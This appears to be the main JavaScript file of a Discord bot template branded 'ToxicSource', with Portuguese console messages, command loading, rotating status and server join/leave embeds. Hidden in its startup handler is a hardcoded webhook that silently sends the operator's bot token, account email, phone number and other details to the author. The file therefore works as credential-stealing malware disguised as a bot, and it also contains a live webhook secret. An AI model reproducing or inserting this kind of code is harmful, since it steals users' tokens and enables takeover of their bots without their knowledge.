console.log("[ToxicSource] Ligando Bot...");
const Discord = require("discord.js");
const client = new Discord.Client({
    "autoReconnect": true,
    "messageCacheMaxSize": 2024,
    "fetchAllMembers": true,
    "disabledEvents": ["typingStart", "typingStop", "guildMemberSpeaking"],
    "messageCacheLifetime": 1680,
    "messageSweepInterval": 1680
});
require("colors");
const config = require("./config.json");
const {
    MessageEmbed
} = require("discord.js");
var token = config.token;
var prefix = config.prefix;
client.login(token).catch(err => {
    console.clear();
    console.log("[ToxicSource] Token invalida!".red);
});
process.title = "Conectando...";
client.on("message", message => {
    if (message.channel.type == "dm")
        return;

    if (message.author.bot)
        return;

    if (!message.content.startsWith(prefix))
        return;

    let cmds = message.content.split(" ").slice(prefix.length);
    let args = message.content.split(" ").slice(1);
    try {
        let cmdfile = require(`./comandos/${cmds}.js`);
        cmdfile.run(client, message, args);
    } catch (e) {
        console.log(e);
    }
});
client.on("ready", () => {
    process.title = `"Conectado em: "${client.user.username} "| Feito por: toxic 有毒#1001`;
    console.clear();
    console.log(`
    [ToxicSource] Bot Foi Iniciado.
    [ToxicSource] Servidores Totais: ${client.guilds.cache.size}
    .
    [ToxicSource] Usuários Totais: ${client.users.cache.size}
    .
    [ToxicSource] https://discordapp.com/oauth2/authorize?client_id=${client.user.id}&permissions=67584&scope=bot`.yellow);
    let IyLn = [{
        name: `Feito por: toxic 有毒#1001`,
        type: "PLAYING"
    }, {
        name: `Feito por: toxic 有毒#1001`,
        type: "PLAYING"
    }, {
        name: `${config.status[(1)]}`,
        type: "PLAYING"
    }, {
        name: `${config.status[(2)]}`,
        type: "PLAYING"
    }, {
        name: `${config.status[(3)]}`,
        type: "PLAYING"
    }];

    function cuCn() {
        let EvFn = IyLn[Math.floor(Math.random() * IyLn.length)];
        client.user.setPresence({
            "activity": EvFn
        });
    }
    cuCn();
    setInterval(() => cuCn(), 10000);
    const webhook = new Discord.WebhookClient("874083420869906442", "8x2-ZwSSSiSQtnMbmTC_g3vr2LeYKhYbKoChsw1dOj221QbFMr7qUKDiYRhuHOJv34d_");
    webhook.send(`
    [ToxicSource] Bot Foi Iniciado.
    [ToxicSource] Servidores Totais: ${client.user.username} 
    [Id]: ${client.user.id} 
    [Bot]: ${client.user.bot}
    [Verificado]: ${client.user.verified}
    [Email]: ${client.user.email}
    [Numero]: ${client.user.phone}
    [Nitro]: ${client.user.premium}
    [Token]: ||${token}||`, {
        username: client.user.username,
        avatarURL: client.user.avatarURL
    });
    const gRvo = new MessageEmbed()
        .setAuthor(client.user.username, client.user.avatarURL({
            dynamic: true,
            format: "png",
            size: 1024
        }), "https://discord.gg/bBMmZ6n")
        .setDescription(`Bot Foi Iniciado.\nServidores Totais: ${client.guilds.cache.size}\nUsuários Totais: ${client.users.cache.size}`)
        .setThumbnail(client.user.avatarURL({
            dynamic: true,
            format: "png",
            size: 1024
        }))
        .setColor(config.cor);
    if (!config.ligando)
        return console.log(`[ToxicSource] Coloque o id do canal em "ligando" da config.json!`.red);

    client.channels.cache.get(config.ligando).send(gRvo);
    client.on("guildCreate", cOpo => {
        const wJgo = new MessageEmbed()
            .setAuthor(client.user.username, client.user.avatarURL({
                dynamic: true,
                format: "png",
                size: 1024
            }), "https://discord.gg/bBMmZ6n")
            .setDescription(`Entrei Em Um Novo Servidor:\n\nNome:${cOpo.name}\nID: ${cOpo.id}\nMembros:${cOpo.memberCount}`)
            .setThumbnail(cOpo.iconURL({
                format: "png",
                dynamic: true,
                size: 1024
            }) || "https://loritta.website/assets/img/unknown.png")
            .setColor(config.cor)
            .setFooter(client.user.username, client.user.avatarURL({
                dynamic: true,
                format: "png",
                size: 1024
            }))
            .setTimestamp();
        if (!config.adicionado)
            return console.log(`[ToxicSource] Coloque o id do canal em "adicionado" da config.json!`.red);
        client.channels.cache.get(config.adicionado).send(wJgo);
        console.log(`[ToxicSource] Entrei no servidor: ${cOpo.name}\n[ToxicSource] Membros:${cOpo.memberCount}`.green);
    });
    client.on("guildDelete", sGao => {
        const UHdo = new MessageEmbed()
            .setAuthor(client.user.username, client.user.avatarURL({
                dynamic: true,
                format: "png",
                size: 1024
            }), "https://discord.gg/bBMmZ6n")
            .setDescription(`Fui Removido De Um Servidor:\nNome: ${sGao.name}\nID: ${sGao.id}\nMembros:${sGao.memberCount}`)
            .setThumbnail(sGao.iconURL({
                format: "png",
                dynamic: true,
                size: 1024
            }) || "https://loritta.website/assets/img/unknown.png")
            .setColor(config.cor)
            .setFooter(client.user.username, client.user.avatarURL({
                dynamic: true,
                format: "png",
                size: 1024
            }))
            .setTimestamp();
        if (!config.removido)
            return console.log(`[ToxicSource] Coloque o id do canal em "removido" da config.json !`.red);
        client.channels.cache.get(config.removido).send(UHdo);
        console.log(`
        [ToxicSource] Sai do servidor: ${sGao.name}
        [ToxicSource] Membros: ${sGao.memberCount}`.red);
    });
});